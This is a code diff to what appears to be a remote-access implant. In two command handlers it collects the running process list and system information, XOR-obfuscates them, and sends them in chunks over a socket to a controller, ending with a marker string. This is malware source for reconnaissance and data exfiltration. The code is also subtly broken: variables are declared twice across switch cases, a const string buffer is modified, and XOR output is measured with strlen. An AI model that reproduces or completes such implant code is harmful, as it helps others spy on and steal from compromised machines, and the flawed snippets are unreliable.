@@ -417,12 +417,16 @@ int main(int argc, char const* argv[]) {
 			case 2:
 				printf("processes");
 				procs = listProcesses();
-				int proclistlen = procs.length();
-				char tempBuf[1024] = {0};
-				while (fgets(tempBuf, 1024, procs)){ //fix
-					strcpy(data,tempBuf);
-							xor_func(data);
-							send(sock, data, strlen(data), 0);
+				int offset = 0;
+				printf("list processes length: %d", procs.length());
+				while (offset < procs.length()) {
+					string chunk = procs.substr(offset, 1024);
+					char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
+					xor_func(c); // xor the chunk
+					const char *chunkBuffer = c; // put xor'd chunk in buffer
+					printf("sending %d bytes", strlen(chunkBuffer));
+					send(sock, chunkBuffer, strlen(chunkBuffer), 0);
+					offset += 1024;
 				}
 				strcpy(data, "gettfouttahereistfg"); // send string to signify end of message
 				xor_func(data);
@@ -431,16 +435,20 @@ int main(int argc, char const* argv[]) {
 			case 3:
 				printf("systeminfo");
 				procs = getSysInfo();
-				int infolen = procs.length();
-				char tempBuf[1024] = {0};
-				while (fgets(tempBuf, 1024, procs)){ //fix (ofstream?)
-					strcpy(data,tempBuf);
-							xor_func(data);
-							send(sock, data, strlen(data), 0);
+				int offset = 0;
+				printf("systeminfo length: %d", procs.length());
+				while (offset < procs.length()) {
+					string chunk = procs.substr(offset, 1024);
+					char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
+					xor_func(c); // xor the chunk
+					const char *chunkBuffer = c; // put xor'd chunk in buffer
+					printf("sending %d bytes", strlen(chunkBuffer));
+					send(sock, chunkBuffer, strlen(chunkBuffer), 0); // send chunk
+					offset += 1024;
 				}
 				strcpy(data, "gettfouttahereistfg"); // send string to signify end of message
-				xor_func(data);
-				send(sock, data, strlen(data), 0);
+				xor_func(data); // xor end string
+				send(sock, data, strlen(data), 0); //send end string
 				break;
 		}
 		//free(path);
